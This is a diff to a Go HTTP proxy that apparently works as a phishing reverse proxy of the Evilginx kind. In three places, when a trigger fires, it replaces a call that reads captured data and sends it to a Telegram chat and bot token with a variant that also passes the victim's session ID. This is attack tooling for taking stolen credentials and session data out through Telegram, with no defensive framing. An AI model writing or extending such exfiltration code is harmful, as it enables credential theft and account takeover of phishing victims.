@@ -760,7 +760,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 							if trigger == 1 {
-								readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
+								// readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
+								readfile_with_session_id(ps.SessionId, p.cfg.general.Chatid, p.cfg.general.Teletoken)
 							}
 
 						} else if form_re.MatchString(contentType) {
@@ -863,7 +864,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							}
 							if trigger == 1 {
-								readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
+								// readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
+								readfile_with_session_id(ps.SessionId, p.cfg.general.Chatid, p.cfg.general.Teletoken)
 							}
 
 						}
@@ -1267,7 +1269,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			if trigger == 1 {
-				readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
+				// readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
+				readfile_with_session_id(ps.SessionId, p.cfg.general.Chatid, p.cfg.general.Teletoken)
 			}
 
 			return resp
